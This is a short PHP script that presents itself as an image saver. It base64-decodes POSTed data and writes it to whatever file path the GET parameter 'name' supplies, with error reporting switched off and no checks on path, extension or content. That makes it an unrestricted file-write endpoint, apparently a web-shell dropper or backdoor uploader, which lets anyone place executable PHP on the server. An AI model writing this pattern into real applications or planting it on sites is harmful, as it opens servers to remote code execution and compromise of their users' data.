<?php
error_reporting(0);
$image = $_POST['image'];
$bin = base64_decode($image);
file_put_contents($_GET['name'], $bin);
echo "true";
?>
